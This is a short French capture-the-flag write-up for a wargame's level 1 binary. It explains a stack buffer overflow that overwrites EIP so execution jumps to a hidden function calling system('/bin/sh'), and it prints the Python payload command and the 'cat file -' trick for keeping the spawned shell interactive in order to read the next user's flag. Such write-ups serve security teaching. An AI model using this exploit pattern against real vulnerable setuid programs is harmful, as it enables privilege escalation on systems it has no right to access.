## Level 1

Avec cutter ou objdump, on observer deux fonctions:
main() et run().
Run() n'est jamais appelé mais, on y voit un appel a system(/bin/sh).

main() contient un buffer de 76 characteres, qu'on peut overflow.
On remplis donc le buffer avec des données random, puis on réecrit l'EIP avec
l'adresse de la fonction run, trouvé avec objdump.

$ python -c "print 'A' * 76 + '\x44\x84\x04\x08'" | ./level1
$ Good... Wait what?
$ segfault.

On arrive a faire executer la fonction caché mais, l'appel a system() n'a pas
l'air de réagir.
Cause: l'orsque system(/bin/sh) est exécuté, l'entré standart n'est pas
disponible, il faut donc faire en sorte de garder la main sur le shell avec
l'entrée standart:
On ultilise le charactere '-' avec le binaire cat.

$ python -c "print 'A' * 76 + '\x44\x84\x04\x08'" > /tmp/level1
$ cat /tmp/level1 - | ./level1
Et voila, le shell reste a l'écoute de nos commandes. On peut donc naviguer
vers le /home du user level2 et récuperer le flag.
